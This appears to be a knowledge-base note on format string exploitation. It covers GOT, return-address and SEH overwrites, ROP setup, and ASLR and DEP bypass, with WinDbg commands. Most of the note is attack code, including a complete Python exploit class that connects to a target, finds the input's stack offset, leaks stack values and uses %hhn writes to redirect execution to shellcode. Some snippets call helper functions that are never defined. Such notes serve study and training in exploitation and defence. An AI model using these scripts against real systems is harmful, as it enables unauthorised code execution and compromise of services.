---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - Format_String
  - Windows
---

## Format String Exploitation
resources: [Format String Exploitation Techniques](https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf)

> Complete exploitation techniques using format string vulnerabilities.

### GOT Overwrite Strategy [Knowledge]
> [!info] Redirect library calls to shellcode:
> 1. Find **GOT** entry for commonly called function (e.g., printf, exit)
> 2. Write shellcode address to GOT entry
> 3. Trigger call to hijacked function
> 4. Execution redirects to shellcode

### Find GOT Address
> Locate Global Offset Table entries.

```text
; Using objdump
objdump -R <binary> | grep printf

; In GDB/WinDbg
0:000> x <module>!*printf*
0:000> dps <module>+<IAT_offset>
```

### GOT Overwrite Exploit
> Overwrite GOT entry with format string.

```python
import struct
import socket

def p32(addr):
    return struct.pack("<I", addr)

# Target: overwrite printf GOT with shellcode address
GOT_PRINTF = 0x08049000
SHELLCODE_ADDR = 0x0804a000

# Position where our input appears on stack
POSITION = 7

# Build write payload (using %hhn for precision)
def build_got_overwrite():
    # Split shellcode address into bytes
    bytes_to_write = [
        (GOT_PRINTF + 0, SHELLCODE_ADDR & 0xFF),
        (GOT_PRINTF + 1, (SHELLCODE_ADDR >> 8) & 0xFF),
        (GOT_PRINTF + 2, (SHELLCODE_ADDR >> 16) & 0xFF),
        (GOT_PRINTF + 3, (SHELLCODE_ADDR >> 24) & 0xFF),
    ]

    # Build payload
    payload = b"".join(p32(addr) for addr, _ in bytes_to_write)

    sorted_writes = sorted(enumerate(bytes_to_write),
                          key=lambda x: x[1][1])

    printed = 16  # 4 addresses
    for orig_idx, (addr, byte_val) in sorted_writes:
        needed = (byte_val - printed) % 256
        if needed > 0:
            payload += f"%{needed}c".encode()
            printed += needed
        payload += f"%{POSITION + orig_idx}$hhn".encode()

    return payload

exploit = build_got_overwrite()
```

### Return Address Overwrite
> Overwrite saved return address on stack.

```python
# Need to know stack address of saved return
# Often from info leak or predictable stack

SAVED_RET = 0xbffff4ac  # Stack address
SHELLCODE_ADDR = 0xbffff500

# Same technique as GOT overwrite
payload = build_write(SAVED_RET, SHELLCODE_ADDR, POSITION)
```

### Overwrite SEH Handler
> Target SEH for Windows exploitation.

```python
# Overwrite SEH handler, trigger exception

SEH_HANDLER = 0x0012ff00  # Address of SEH handler on stack
POP_POP_RET = 0x10001000  # P/P/R gadget

payload = build_write(SEH_HANDLER, POP_POP_RET, POSITION)
payload += b"\xcc" * 100  # Trigger access violation
```

### Format String to ROP
> Use format string to set up ROP chain.

```python
# Write ROP gadget addresses to stack
# Then trigger return to begin ROP execution

ROP_CHAIN = [
    0x10001000,  # pop eax; ret
    0x41414141,  # value for eax
    0x10001004,  # pop ecx; ret
    # ...
]

STACK_ADDR = 0xbffff400  # Where to write ROP chain

for i, gadget in enumerate(ROP_CHAIN):
    write_dword(STACK_ADDR + i*4, gadget, POSITION)
```

### Complete Format String Exploit
> Full exploitation script.

```python
#!/usr/bin/env python3
import socket
import struct

def p32(addr):
    return struct.pack("<I", addr)

def u32(data):
    return struct.unpack("<I", data)[0]

class FormatStringExploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.position = None

    def connect(self):
        self.sock = socket.socket()
        self.sock.connect((self.host, self.port))

    def send(self, data):
        self.sock.send(data + b"\n")
        return self.sock.recv(4096)

    def find_position(self):
        """Find stack position of our input"""
        for i in range(1, 50):
            self.connect()
            resp = self.send(f"AAAA%{i}$08x".encode())
            self.sock.close()
            if b"41414141" in resp:
                self.position = i
                return i
        return None

    def leak_stack(self, count=20):
        """Leak stack values"""
        self.connect()
        payload = b".%08x" * count
        resp = self.send(payload)
        self.sock.close()
        return resp.split(b".")

    def write_byte(self, addr, value):
        """Write single byte to address"""
        payload = p32(addr)
        printed = 4
        needed = (value - printed) % 256
        if needed > 0:
            payload += f"%{needed}c".encode()
        payload += f"%{self.position}$hhn".encode()
        return payload

    def write_dword(self, addr, value):
        """Write DWORD using 4 %hhn writes"""
        addrs = [p32(addr + i) for i in range(4)]
        bytes_list = [(value >> (i*8)) & 0xFF for i in range(4)]

        # Sort by byte value to minimize padding
        indexed = list(enumerate(zip(addrs, bytes_list)))
        sorted_idx = sorted(indexed, key=lambda x: x[1][1])

        payload = b"".join(addr for _, (addr, _) in sorted_idx)
        printed = 16

        for orig_pos, (_, byte_val) in sorted_idx:
            needed = (byte_val - printed) % 256
            if needed > 0:
                payload += f"%{needed}c".encode()
                printed += needed
            payload += f"%{self.position + orig_pos}$hhn".encode()

        return payload

    def exploit_got(self, got_addr, shellcode_addr):
        """Overwrite GOT entry"""
        if not self.position:
            self.find_position()

        payload = self.write_dword(got_addr, shellcode_addr)

        self.connect()
        self.send(payload)
        # Next call to GOT function triggers shellcode

# Usage
exp = FormatStringExploit("<TargetIP>", <Port>)
exp.find_position()
print(f"Input at position: {exp.position}")

# Leak addresses
stack = exp.leak_stack()
print("Stack values:", stack[:10])

# Exploit
exp.exploit_got(0x08049000, 0x0804a000)
```

### Bypass ASLR with Format String
> Leak then exploit.

```python
# Stage 1: Leak stack to find module base
leaks = exp.leak_stack(50)
# Find return address in leaks
ret_addr = find_return_in_leaks(leaks)
base = ret_addr - KNOWN_OFFSET

# Stage 2: Calculate addresses
got_printf = base + GOT_OFFSET
shellcode_loc = base + SHELLCODE_OFFSET

# Stage 3: Exploit
exp.exploit_got(got_printf, shellcode_loc)
```

### Format String + DEP Bypass
> Combine with ROP for modern systems.

```python
# 1. Leak base address
# 2. Calculate ROP gadgets
# 3. Write ROP chain to stack using format string
# 4. Overwrite return address to start chain

def write_rop_chain(exp, stack_base, rop_gadgets):
    """Write ROP chain using format string"""
    for i, gadget in enumerate(rop_gadgets):
        addr = stack_base + (i * 4)
        exp.connect()
        payload = exp.write_dword(addr, gadget)
        exp.send(payload)
        exp.sock.close()
```

### Debugging Format String Exploits
> Verify writes are working.

```text
; Watch target address
0:000> ba w1 <GOT_ADDR>

; Examine after format string
0:000> dd <GOT_ADDR> L1

; Single step through printf
0:000> bp printf
0:000> g
0:000> p    ; Step through format parsing
```

